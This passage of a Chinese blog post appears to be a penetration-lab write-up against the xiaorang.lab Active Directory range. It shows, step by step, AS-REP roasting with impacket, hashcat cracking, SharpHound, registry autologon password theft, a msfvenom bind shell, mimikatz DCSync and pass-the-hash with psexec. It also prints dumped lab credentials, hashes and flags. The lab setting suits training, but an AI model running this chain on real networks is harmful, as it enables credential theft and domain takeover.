+| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |
+| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |
+| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |
+| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |
+| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |
+| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |
+| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |
+| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |
+| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |
+| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |
+| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |
+| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |
+| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |
+| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |
+| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |
+| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |
+| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |
+| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |
+| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |
+| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |
+| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |
+| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |
+| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |
+| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |
+| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |
+| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |
+| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |
+| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |
++-----+----------------------------+-------------+-----------------+
+</code></pre><p>oa管理员账户密码</p>
+<pre tabindex="0"><code>[1 entry]
++----+------------------+---------------+
+| id | password         | username      |
++----+------------------+---------------+
+| 1  | bo2y8kAL3HnXUiQo | administrator |
++----+------------------+---------------+
+</code></pre><h3 id="flag3flag4">FLAG3&amp;FLAG4<a hidden class="anchor" aria-hidden="true" href="#flag3flag4">#</a></h3>
+<h4 id="as-reproasting">AS-REPRoasting<a hidden class="anchor" aria-hidden="true" href="#as-reproasting">#</a></h4>
+<p>拿到这堆user信息我们大概可以猜到要打<strong>AS-REPRoasting</strong>了</p>
+<p>先把这堆用户整理成一个用户字典user.txt</p>
+<p>我们可以通过impacket-GetNPUsers工具进行枚举，收集配置了“不需要预身份验证”的用户</p>
+<pre tabindex="0"><code>proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/ 
+</code></pre><p>可以拿到两个用户的TGT票据</p>
+<pre tabindex="0"><code>$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c
+
+$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1
+</code></pre><p>用hashcat爆破出明文密码，用的kali自带的rockyou字典</p>
+<pre tabindex="0"><code>hashcat -m 18200 --force -a 0 &#39;$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c&#39; ./rockyou.txt
+
+hashcat -m 18200 --force -a 0 &#39;$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1&#39; ./rockyou.txt
+</code></pre><p><img alt="image-20250408125400038" loading="lazy" src="../assets/image-20250408125400038.png"></p>
+<p><img alt="image-20250408125435162" loading="lazy" src="../assets/image-20250408125435162.png"></p>
+<pre tabindex="0"><code>wenshao@xiaorang.lab/hellokitty
+zhangxin@xiaorang.lab/strawberry
+</code></pre><p>尝试rdp到172.22.6.12</p>
+<p><img alt="image-20250408125723972" loading="lazy" src="../assets/image-20250408125723972.png"></p>
+<p>发现没授权远程登录</p>
+<p>但是另一台机子172.22.6.25是可以登上的，但是拿不到flag</p>
+<p><img alt="image-20250408130431964" loading="lazy" src="../assets/image-20250408130431964.png"></p>
+<p>我们先信息收集一手</p>
+<p>传一个SharpHound</p>
+<pre tabindex="0"><code>SharpHound.exe -c all
+</code></pre><p>Find Shortest Paths to Domain Admins</p>
+<p><img alt="image-20250408133444802" loading="lazy" src="../assets/image-20250408133444802.png"></p>
+<p><img alt="image-20250408133518037" loading="lazy" src="../assets/image-20250408133518037.png"></p>
+<p>可以看到yuxuan这个用户有SIDHistory，也就是说相当于是域管</p>
+<p><img alt="image-20250408133723672" loading="lazy" src="../assets/image-20250408133723672.png"></p>
+<p>所有我们下一个目标就是要拿下yuxuan这个用户</p>
+<p>而且yuxuan这个用户在172.22.6.25上拥有会话。（HasSession）</p>
+<p>用户与计算机时进行会话时，凭据会保留在内存中。说明用户登陆过该主机。</p>
+<h4 id="hassession">HasSession<a hidden class="anchor" aria-hidden="true" href="#hassession">#</a></h4>
+<h5 id="方法一">方法一<a hidden class="anchor" aria-hidden="true" href="#方法一">#</a></h5>
+<p>直接查注册表，可以看到yuxuan这个账户设置了自动登录，而且能拿到明文密码</p>
+<pre tabindex="0"><code>reg query &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;
+</code></pre><p><img alt="image-20250408171055416" loading="lazy" src="../assets/image-20250408171055416.png"></p>
+<blockquote>
+<p>在 Windows 系统中，域用户自动登录的相关设置保存在注册表中。具体路径为 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>。若该路径下存在 <code>AutoAdminLogon</code> 键值且其数据数值为 <code>1</code>，同时 <code>DefaultDomainName</code> <code>DefaultUserName</code> <code>DefaultPassword</code> 等键值也有相应的正确设置，那么说明该域用户设置了自动登录。</p></blockquote>
+<pre tabindex="0"><code>yuxuan/Yuxuan7QbrgZ3L
+</code></pre><h5 id="方法二">方法二<a hidden class="anchor" aria-hidden="true" href="#方法二">#</a></h5>
+<p>小豌豆信息收集一手就能抓到</p>
+<p><img alt="image-20250408171338691" loading="lazy" src="../assets/image-20250408171338691.png"></p>
+<h5 id="方法三">方法三<a hidden class="anchor" aria-hidden="true" href="#方法三">#</a></h5>
+<p>用户设置了自动登录可以用msf抓取自动登录的账户密码</p>
+<p>msf生成一个正向代理的shell，在靶机上运行</p>
+<pre tabindex="0"><code>msfvenom -p windows/meterpreter/bind_tcp -f exe -o 1.exe
+</code></pre><p>接着用msf连上去</p>
+<pre tabindex="0"><code>use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set rhost 172.22.6.25
+run
+</code></pre><p>抓自动登录的账号密码</p>
+<pre tabindex="0"><code>meterpreter &gt; run windows/gather/credentials/windows_autologin
+</code></pre><h4 id="hassidhistory">HasSIDHistory<a hidden class="anchor" aria-hidden="true" href="#hassidhistory">#</a></h4>
+<blockquote>
+<p>SID History是在域迁移过程中需要使用的一个属性。</p>
+<p>如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。</p>
+<p><strong>SID History的作用是在域迁移过程中保持域用户的访问权限</strong>，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源</p>
+<p><a href="https://www.cnblogs.com/xiaoxiaosen/p/13535868.html">域权限维持-SID History - xiaoxiaosen - 博客园</a></p></blockquote>
+<p>拿到明文密码我们直接rdp上去</p>
+<p>因为有SID History这个用户可以访问域管的资源，所以我们可以直接拿mimikatz去dump域管的hash</p>
+<pre tabindex="0"><code>lsadump::dcsync /domain:xiaorang.lab /all /csv
+</code></pre><p><img alt="image-20250408173038788" loading="lazy" src="../assets/image-20250408173038788.png"></p>
+<p>拿到域管的hash</p>
+<pre tabindex="0"><code>500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512
+</code></pre><p>接下来我们就可以PTH拿flag了</p>
+<pre tabindex="0"><code>proxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.12
+</code></pre><pre tabindex="0"><code>C:\Windows\system32&gt; type c:\Users\Administrator\flag\flag04.txt
+Awesome! you got the final flag.
+
+::::::::::::::::::::::::::    :::: ::::::::::
+    :+:        :+:    +:+:+: :+:+:+:+:
+    +:+        +:+    +:+ +:+:+ +:++:+
+    +#+        +#+    +#+  +:+  +#++#++:++#
+    +#+        +#+    +#+       +#++#+
+    #+#        #+#    #+#       #+##+#
+    ###    ##############       #############
+
+
+flag04: flag{26180e6b-5b97-47ca-a861-a160ef12166c}
+</code></pre><pre tabindex="0"><code>proxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.25
+</code></pre><pre tabindex="0"><code>C:\Windows\system32&gt; type c:\Users\Administrator\flag\flag03.txt
+flag03: flag{ff39758a-623e-4f1f-b0bb-bb5f6d31ca83}
+
+
+Maybe you can find something interesting on this server.
+=======================================
+What you may not know is that many objects in this domain
+are moved from other domains.
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
+      <li><a href="http://localhost:1313/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
+      <li><a href="http://localhost:1313/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>春秋云镜-Exchange-Writeup</span>
+  </a>
+  <a class="next" href="http://localhost:1313/post/nctf_2024/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>NCTF-2025-Web-Writeup</span>
+  </a>
+</nav>
+
+  </footer><div id="tw-comment"></div>
+<script>
+    
+    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
+    const setGiscusTheme = () => {
+        const sendMessage = (message) => {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe) {
+                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
+            }
+        }
+        sendMessage({setConfig: {theme: getStoredTheme()}})
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const giscusAttributes = {
+            "src": "https://giscus.app/client.js",
+            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
+            "data-repo-id": "xxxxxx",
+            "data-category": "Announcements",
+            "data-category-id": "xxxxx",
+            "data-mapping": "pathname",
+            "data-strict": "0",
+            "data-reactions-enabled": "1",
+            "data-emit-metadata": "0",
+            "data-input-position": "bottom",
+            "data-theme": getStoredTheme(),
+            "data-lang": "zh-CN",
+            "data-loading": "lazy",
+            "crossorigin": "anonymous",
+        };
+
+        
+        const giscusScript = document.createElement("script");
+        Object.entries(giscusAttributes).forEach(
+                ([key, value]) => giscusScript.setAttribute(key, value));
+        document.querySelector("#tw-comment").appendChild(giscusScript);
+
+        
+        const themeSwitcher = document.querySelector("#theme-toggle");
+        if (themeSwitcher) {
+            themeSwitcher.addEventListener("click", setGiscusTheme);
+        }
+        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
+        if (themeFloatSwitcher) {
+            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
+        }
+    });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 
+
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+    <div class="busuanzi-footer">
+        <span id="busuanzi_container_site_pv">Site Visits：<span id="busuanzi_value_site_pv"></span></span>
+    </div></footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
